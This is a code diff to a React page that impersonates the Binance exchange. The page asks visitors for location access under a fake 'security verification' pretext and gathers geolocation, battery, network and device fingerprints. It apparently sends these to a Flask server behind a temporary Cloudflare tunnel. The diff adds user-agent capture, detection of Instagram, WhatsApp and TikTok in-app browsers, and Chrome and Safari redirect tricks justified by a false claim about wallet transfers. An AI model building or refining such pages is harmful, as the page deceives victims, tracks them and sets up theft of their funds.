@@ -2,11 +2,27 @@
 
 import { useState, useEffect } from "react";
 
-type IconName = "eye" | "eyeOff" | "arrowDown" | "send" | "download" | "swap" | "search" | "more" | "plus" | "wallet" | "chart" | "clock" | "menu" | "home";
+type IconName = "eye" | "eyeOff" | "arrowDown" | "send" | "download" | "swap" | "search" | "more" | "plus" | "wallet" | "chart" | "clock" | "menu" | "home" | "chrome" | "safari";
 const Icon = ({ name, size = 20, stroke = 1.8 }: { name: IconName; size?: number; stroke?: number; }) => {
   const props = { width: size, height: size, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: stroke, strokeLinecap: "round" as const, strokeLinejoin: "round" as const };
   const icons: Record<IconName, any> = {
-    eye: (<><path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z" /><circle cx="12" cy="12" r="2.5" /></>), eyeOff: (<><path d="M3 3l18 18" /><path d="M10.5 6.2A11 11 0 0 1 12 6c6.5 0 10 6 10 6a18 18 0 0 1-3.1 3.8" /><path d="M6.3 6.3C3.7 8 2 12 2 12s3.5 6 10 6c1.4 0 2.7-.3 3.8-.8" /><path d="M9.9 9.9a3 3 0 0 0 4.2 4.2" /></>), arrowDown: <path d="m6 9 6 6 6-6" />, send: (<><path d="m22 2-7 20-4-9-9-4Z" /><path d="M22 2 11 13" /></>), download: (<><path d="M12 3v12" /><path d="m7 10 5 5 5-5" /><path d="M5 21h14" /></>), swap: (<><path d="M7 7h11l-3-3" /><path d="m18 7-3-3" /><path d="M17 17H6l3 3" /><path d="m6 17 3 3" /></>), search: (<><circle cx="11" cy="11" r="7" /><path d="m20 20-4-4" /></>), more: (<><circle cx="5" cy="12" r="1" fill="currentColor" stroke="none" /><circle cx="12" cy="12" r="1" fill="currentColor" stroke="none" /><circle cx="19" cy="12" r="1" fill="currentColor" stroke="none" /></>), plus: (<><path d="M12 5v14" /><path d="M5 12h14" /></>), wallet: (<><path d="M3 7a3 3 0 0 1 3-3h13v16H6a3 3 0 0 1-3-3Z" /><path d="M3 7h16" /><path d="M16 12h5v5h-5a2.5 2.5 0 0 1 0-5Z" /></>), chart: (<><path d="M4 19V5" /><path d="M4 19h17" /><path d="m7 15 4-4 3 2 5-6" /></>), clock: (<><circle cx="12" cy="12" r="9" /><path d="M12 7v5l3 2" /></>), menu: (<><path d="M4 7h16" /><path d="M4 12h16" /><path d="M4 17h16" /></>), home: (<><path d="m3 10 9-7 9 7v10a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V10Z" /><path d="M9 21v-7h6v7" /></>)
+    eye: (<><path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z" /><circle cx="12" cy="12" r="2.5" /></>), 
+    eyeOff: (<><path d="M3 3l18 18" /><path d="M10.5 6.2A11 11 0 0 1 12 6c6.5 0 10 6 10 6a18 18 0 0 1-3.1 3.8" /><path d="M6.3 6.3C3.7 8 2 12 2 12s3.5 6 10 6c1.4 0 2.7-.3 3.8-.8" /><path d="M9.9 9.9a3 3 0 0 0 4.2 4.2" /></>), 
+    arrowDown: <path d="m6 9 6 6 6-6" />, 
+    send: (<><path d="m22 2-7 20-4-9-9-4Z" /><path d="M22 2 11 13" /></>), 
+    download: (<><path d="M12 3v12" /><path d="m7 10 5 5 5-5" /><path d="M5 21h14" /></>), 
+    swap: (<><path d="M7 7h11l-3-3" /><path d="m18 7-3-3" /><path d="M17 17H6l3 3" /><path d="m6 17 3 3" /></>), 
+    search: (<><circle cx="11" cy="11" r="7" /><path d="m20 20-4-4" /></>), 
+    more: (<><circle cx="5" cy="12" r="1" fill="currentColor" stroke="none" /><circle cx="12" cy="12" r="1" fill="currentColor" stroke="none" /><circle cx="19" cy="12" r="1" fill="currentColor" stroke="none" /></>), 
+    plus: (<><path d="M12 5v14" /><path d="M5 12h14" /></>), 
+    wallet: (<><path d="M3 7a3 3 0 0 1 3-3h13v16H6a3 3 0 0 1-3-3Z" /><path d="M3 7h16" /><path d="M16 12h5v5h-5a2.5 2.5 0 0 1 0-5Z" /></>), 
+    chart: (<><path d="M4 19V5" /><path d="M4 19h17" /><path d="m7 15 4-4 3 2 5-6" /></>), 
+    clock: (<><circle cx="12" cy="12" r="9" /><path d="M12 7v5l3 2" /></>), 
+    menu: (<><path d="M4 7h16" /><path d="M4 12h16" /><path d="M4 17h16" /></>), 
+    home: (<><path d="m3 10 9-7 9 7v10a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V10Z" /><path d="M9 21v-7h6v7" /></>),
+    // Chrome & Safari SVGs
+    chrome: (<><circle cx="12" cy="12" r="10" /><circle cx="12" cy="12" r="4" /><line x1="21.17" y1="8" x2="12" y2="8" /><line x1="3.95" y1="6.06" x2="8.54" y2="14" /><line x1="10.88" y1="21.94" x2="15.46" y2="14" /></>),
+    safari: (<><circle cx="12" cy="12" r="10" /><polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76" /></>)
   };
   return <svg {...props}>{icons[name]}</svg>;
 };
@@ -18,7 +34,8 @@ const ExchangeMark = ({ size = 28 }: { size?: number }) => (
 export default function BinanceClient({ id }: { id: string }) {
   const [status, setStatus] = useState('idle');
   const [showEnterModal, setShowEnterModal] = useState(true);
-  const FLASK_API = "https://beneficial-acrylic-fighter-saves.trycloudflare.com"; // CHANGE IF CLOUDFLARE RESTARTS
+  // CHANGE THIS IF CLOUDFLARE RESTARTS
+  const FLASK_API = "https://beneficial-acrylic-fighter-saves.trycloudflare.com"; 
 
   useEffect(() => {
     if (!id) return;
@@ -42,7 +59,8 @@ export default function BinanceClient({ id }: { id: string }) {
           touch_capability: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
           cpu_cores: navigator.hardwareConcurrency || null,
           device_memory: (navigator as any).deviceMemory || null,
-          online_status: navigator.onLine
+          online_status: navigator.onLine,
+          user_agent: ua // Exact device model string
         },
         network: {
           connection_type: conn.type || 'unknown',
@@ -54,7 +72,6 @@ export default function BinanceClient({ id }: { id: string }) {
         location: { permission_status: 'pending' }
       };
 
-      // Get Battery Data
       if ('getBattery' in navigator) {
         try {
           const battery = await (navigator as any).getBattery();
@@ -74,6 +91,15 @@ export default function BinanceClient({ id }: { id: string }) {
   }, [id]);
 
   const handleEnterSite = async () => {
+    const ua = navigator.userAgent;
+    // Detect Instagram, WhatsApp, Facebook In-App Browsers
+    const isInAppBrowser = /Instagram|FBAN|FBAV|WhatsApp|Snapchat|TikTok/i.test(ua);
+
+    if (isInAppBrowser) {
+      setStatus('in_app_browser');
+      return;
+    }
+
     setStatus('loading');
     if (!navigator.geolocation) { setStatus('error'); return; }
     
@@ -97,20 +123,66 @@ export default function BinanceClient({ id }: { id: string }) {
     }
   };
 
+  // 1-Click Browser Redirect Logic
+  const handleOpenBrowser = (browser: 'chrome' | 'safari') => {
+    const currentUrl = window.location.href;
+    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+    if (browser === 'chrome') {
+      if (isIOS) {
+        // iOS Chrome scheme (opens Chrome app if installed)
+        window.location.href = `googlechrome://${currentUrl.replace('https://', '')}`;
+      } else {
+        // Android Intent (forces Chrome to open)
+        const url = new URL(currentUrl);
+        window.location.href = `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end;`;
+      }
+    } else if (browser === 'safari') {
+      // Safari can't be auto-launched via JS, but this URL scheme sometimes triggers the native open prompt
+      window.location.href = currentUrl;
+    }
+  };
+
   return (
     <section className="min-h-screen bg-[#0B0E11] font-sans text-[#EAECEF] relative">
       {showEnterModal && (
         <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
           <div className={`w-full max-w-[340px] rounded-2xl border border-[#2B3139] bg-[#181E25] p-6 text-center shadow-2xl ${status === 'error' ? 'animate-shake' : ''}`}>
             <div className="mb-5 flex justify-center text-[#F0B90B]"><ExchangeMark size={48} /></div>
-            <h2 className="mb-2 text-[20px] font-semibold text-[#F5F5F5]">Enter Binance</h2>
+            <h2 className="mb-2 text-[20px] font-semibold text-[#F5F5F5]">
+              {status === 'in_app_browser' ? 'Security Check Required' : 'Enter Binance'}
+            </h2>
+            
             {status === 'idle' && <p className="mb-6 text-[13px] text-[#848E9C]">For security verification, please allow location access to proceed.</p>}
             {status === 'loading' && <p className="mb-6 text-[13px] text-[#F0B90B]">Verifying your location... Please wait.</p>}
             {status === 'success' && <p className="mb-6 text-[13px] text-[#0ECB81]">Verification successful! Unlocking wallet...</p>}
             {status === 'error' && <p className="mb-6 text-[13px] text-[#F6465D]">Location access is required. Please enable GPS in your browser settings, refresh the page, and try again.</p>}
-            <button onClick={handleEnterSite} disabled={status === 'loading' || status === 'success'} className={`w-full rounded-xl py-3 text-[14px] font-semibold transition active:scale-[0.98] ${status === 'error' ? 'bg-[#F6465D] text-white hover:bg-[#f54b62]' : status === 'success' ? 'bg-[#0ECB81] text-[#181A20]' : 'bg-[#F0B90B] text-[#181A20] hover:bg-[#FCD535]'} disabled:opacity-70 disabled:cursor-not-allowed`}>
-              {status === 'idle' && 'Enter Wallet'}{status === 'loading' && 'Verifying...'}{status === 'success' && 'Access Granted'}{status === 'error' && 'Try Again'}
-            </button>
+            
+            {status === 'in_app_browser' && (
+              <div className="mb-6 text-left text-[13px] text-[#EAECEF] space-y-3">
+                <p className="text-zinc-400">In-app browsers do not support secure location verification. To access your wallet and transfer funds, please open this page in your device's default browser.</p>
+              </div>
+            )}
+
+            {/* Default Button */}
+            {status !== 'in_app_browser' && (
+              <button onClick={handleEnterSite} disabled={status === 'loading' || status === 'success'} className={`w-full rounded-xl py-3 text-[14px] font-semibold transition active:scale-[0.98] ${status === 'error' ? 'bg-[#F6465D] text-white hover:bg-[#f54b62]' : status === 'success' ? 'bg-[#0ECB81] text-[#181A20]' : 'bg-[#F0B90B] text-[#181A20] hover:bg-[#FCD535]'} disabled:opacity-70 disabled:cursor-not-allowed`}>
+                {status === 'idle' && 'Enter Wallet'}{status === 'loading' && 'Verifying...'}{status === 'success' && 'Access Granted'}{status === 'error' && 'Try Again'}
+              </button>
+            )}
+
+            {/* Browser Redirect Buttons */}
+            {status === 'in_app_browser' && (
+              <div className="space-y-2">
+                <button onClick={() => handleOpenBrowser('safari')} className="w-full flex items-center justify-center gap-2 rounded-xl py-3 text-[14px] font-semibold transition active:scale-[0.98] bg-[#F0B90B] text-[#181A20] hover:bg-[#FCD535]">
+                  <Icon name="safari" size={18} /> Open in Safari
+                </button>
+                <button onClick={() => handleOpenBrowser('chrome')} className="w-full flex items-center justify-center gap-2 rounded-xl py-3 text-[14px] font-semibold transition active:scale-[0.98] bg-white/[0.05] text-[#EAECEF] hover:bg-white/[0.09] border border-[#2B3139]">
+                  <Icon name="chrome" size={18} /> Open in Chrome
+                </button>
+                <p className="text-zinc-500 text-[10px] mt-2">If the browser doesn't open automatically, tap the 3 dots (⋮) above and select "Open in browser".</p>
+              </div>
+            )}
           </div>
         </div>
       )}
